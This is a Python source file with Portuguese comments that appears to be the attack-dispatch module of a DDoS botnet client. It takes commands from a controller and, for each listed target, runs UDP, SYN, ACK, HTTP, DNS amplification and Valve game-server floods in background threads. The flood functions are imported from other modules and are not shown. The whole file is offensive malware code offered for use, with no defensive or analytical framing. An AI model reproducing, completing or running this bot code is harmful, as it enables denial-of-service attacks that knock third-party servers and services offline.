#!/usr/bin/env python3
"""
Router de ataques — recebe um AttackCommand e executa o vetor correspondente.
Cada ataque roda em uma thread/processo separado com limite de tempo.
"""

import asyncio
import logging
import time
import threading
from enum import IntEnum
from typing import Optional

from protocol import AttackCommand, AttackType, Target

# Importa os módulos de ataque
from udp import udp_attack
from syn import syn_attack
from dns import dns_amplification
from http import http_flood
from vse import vse_attack

log = logging.getLogger('attacks')


class AttackRunner:
    """Gerencia a execução de ataques no bot."""
    
    def __init__(self):
        self.current_attack: Optional[dict] = None
        self._stop_event = threading.Event()
        self._thread: Optional[threading.Thread] = None
    
    def execute(self, cmd: AttackCommand) -> bool:
        """Executa um ataque. Retorna True se iniciou com sucesso."""
        
        if self.current_attack and not self._stop_event.is_set():
            log.warning("[!] Já existe um ataque em execução. Pare primeiro.")
            return False
        
        self._stop_event.clear()
        
        targets_str = ", ".join(str(t) for t in cmd.targets)
        log.info(f"[*] Iniciando ataque: {cmd.attack_type.name} -> {targets_str} por {cmd.duration}s")
        
        # Extrai opções do comando
        opts = {}
        for opt in cmd.options:
            opts[opt.key] = opt.value
        
        # Roteia para o ataque correto
        attack_map = {
            AttackType.UDP: self._run_udp,
            AttackType.VSE: self._run_vse,
            AttackType.DNS: self._run_dns,
            AttackType.SYN: self._run_syn,
            AttackType.ACK: self._run_ack,
            AttackType.STOMP: self._run_stomp,
            AttackType.GREIP: self._run_greip,
            AttackType.GREETH: self._run_greeth,
            AttackType.UDP_PLAIN: self._run_udp_plain,
            AttackType.HTTP: self._run_http,
        }
        
        handler = attack_map.get(cmd.attack_type)
        if not handler:
            log.error(f"[!] Tipo de ataque desconhecido: {cmd.attack_type}")
            return False
        
        # Executa em thread separada para não bloquear
        self._thread = threading.Thread(
            target=handler,
            args=(cmd, opts),
            daemon=True
        )
        self._thread.start()
        
        self.current_attack = {
            'cmd': cmd,
            'started': time.time(),
            'thread': self._thread
        }
        
        return True
    
    def stop(self):
        """Para o ataque atual."""
        if self.current_attack:
            log.info("[!] Parando ataque atual...")
            self._stop_event.set()
            self.current_attack = None
    
    def _run_udp(self, cmd: AttackCommand, opts: dict):
        """UDP flood."""
        for target in cmd.targets:
            udp_attack(
                target_ip=str(target.addr),
                target_port=int(opts.get(0, b"80").decode()),
                duration=cmd.duration,
                stop_event=self._stop_event
            )
    
    def _run_vse(self, cmd: AttackCommand, opts: dict):
        """Valve Source Engine query flood."""
        for target in cmd.targets:
            vse_attack(
                target_ip=str(target.addr),
                target_port=int(opts.get(0, b"27015").decode()),
                duration=cmd.duration,
                stop_event=self._stop_event
            )
    
    def _run_dns(self, cmd: AttackCommand, opts: dict):
        """DNS amplification."""
        for target in cmd.targets:
            dns_amplification(
                target_ip=str(target.addr),
                target_port=int(opts.get(0, b"53").decode()),
                duration=cmd.duration,
                stop_event=self._stop_event
            )
    
    def _run_syn(self, cmd: AttackCommand, opts: dict):
        """SYN flood."""
        for target in cmd.targets:
            syn_attack(
                target_ip=str(target.addr),
                target_port=int(opts.get(0, b"80").decode()),
                duration=cmd.duration,
                stop_event=self._stop_event,
                ack=False
            )
    
    def _run_ack(self, cmd: AttackCommand, opts: dict):
        """ACK flood."""
        for target in cmd.targets:
            syn_attack(
                target_ip=str(target.addr),
                target_port=int(opts.get(0, b"80").decode()),
                duration=cmd.duration,
                stop_event=self._stop_event,
                ack=True
            )
    
    def _run_stomp(self, cmd: AttackCommand, opts: dict):
        """TCP STOMP — conexão TCP + dados."""
        self._run_syn(cmd, opts)  # Simplificado: mesmo que SYN por enquanto
    
    def _run_greip(self, cmd: AttackCommand, opts: dict):
        """GRE over IP — requer tun/tap, fallback para UDP."""
        log.warning("[!] GRE não implementado — usando UDP como fallback")
        self._run_udp(cmd, opts)
    
    def _run_greeth(self, cmd: AttackCommand, opts: dict):
        """GRE over Ethernet — fallback para UDP."""
        log.warning("[!] GRE não implementado — usando UDP como fallback")
        self._run_udp(cmd, opts)
    
    def _run_udp_plain(self, cmd: AttackCommand, opts: dict):
        """UDP plain — sem randomização."""
        for target in cmd.targets:
            udp_attack(
                target_ip=str(target.addr),
                target_port=int(opts.get(0, b"80").decode()),
                duration=cmd.duration,
                stop_event=self._stop_event,
                randomize=False
            )
    
    def _run_http(self, cmd: AttackCommand, opts: dict):
        """HTTP flood (GET/POST)."""
        for target in cmd.targets:
            http_flood(
                target_ip=str(target.addr),
                target_port=int(opts.get(0, b"80").decode()),
                duration=cmd.duration,
                stop_event=self._stop_event,
                method=opts.get(1, b"GET").decode()
            )
    
    @property
    def is_busy(self) -> bool:
        return self.current_attack is not None and not self._stop_event.is_set()


# Singleton global para o bot
attack_runner = AttackRunner()


def execute_attack(cmd: AttackCommand) -> bool:
    """Função pública para executar ataque."""
    return attack_runner.execute(cmd)


def stop_attack():
    """Função pública para parar ataque."""
    attack_runner.stop()
